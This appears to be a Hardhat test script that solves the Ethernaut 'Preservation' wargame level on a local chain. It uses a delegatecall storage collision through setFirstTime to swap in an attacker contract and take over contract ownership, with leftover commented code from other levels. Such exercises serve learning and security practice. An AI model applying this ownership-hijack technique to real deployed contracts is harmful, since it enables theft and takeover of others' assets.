const {expect} = require('chai');
const {ethers, waffle} = require('hardhat');

describe('Preservation', function () {
	it('should break', async function () {
		const [owner, knower] = await ethers.getSigners();
		console.log('owner.address', owner.address);

		const LibraryContract = await ethers.getContractFactory('LibraryContract');
		const lbc1 = await LibraryContract.deploy();
		await lbc1.deployed();
		console.log('lbc1', lbc1.address);

		const LibraryContract2 = await ethers.getContractFactory('LibraryContract');
		const lbc2 = await LibraryContract2.deploy();
		await lbc2.deployed();
		console.log('lbc2', lbc2.address);

		const Preservation = await ethers.getContractFactory('Preservation');
		const preservation = await Preservation.deploy(lbc1.address, lbc2.address);
		await preservation.deployed();

		const PreservationBreak = await ethers.getContractFactory(
			'PreservationBreak'
		);
		const prBreak = await PreservationBreak.deploy();
		await prBreak.deployed();
		console.log('prBreak.address', prBreak.address);
		// address20 -> uint256(32) 0x5FbDB2315678afecb367f032d93F642f64180aa3

		// ethers.utils.hexZeroPad(ethers.utils.hexlify(1), 32);

		// const GK2Break = await ethers.getContractFactory('GK2Break');
		// const gk2Break = await GK2Break.deploy(gk2.address);
		// await gk2Break.deployed();

		// await knower.sendTransaction({
		// 	to: reentrance.address,
		// 	value: ethers.utils.parseEther('0.001'),
		// });

		// let ethBal = await waffle.provider.getBalance(reentrance.address);
		// console.log('ethBal', ethBal);

		await (await preservation.setFirstTime(prBreak.address)).wait();

		// await (
		// 	await preservation.storedTime()
		// ).wait();

		console.log('timeZone1Library', await preservation.timeZone1Library());
		console.log('timeZone2Library', await preservation.timeZone2Library());
		console.log('owner', await preservation.owner());
		console.log('storedTime', await preservation.storedTime());

		await (await preservation.setFirstTime(knower.address)).wait();

		console.log('finalOwner', await preservation.owner());

		// await (await dr.attack('1000000000000000')).wait();

		// ethBal = await waffle.provider.getBalance(reentrance.address);
		// console.log('ethBalAfter', ethBal);
		// let y;
		// for (let x = 0; x < 4294967296; x++) {
		// 	if ((x % 256 == x % 65536) == 8806) {
		// 		console.log('X:', x);
		// 	}
		// }
	});
});
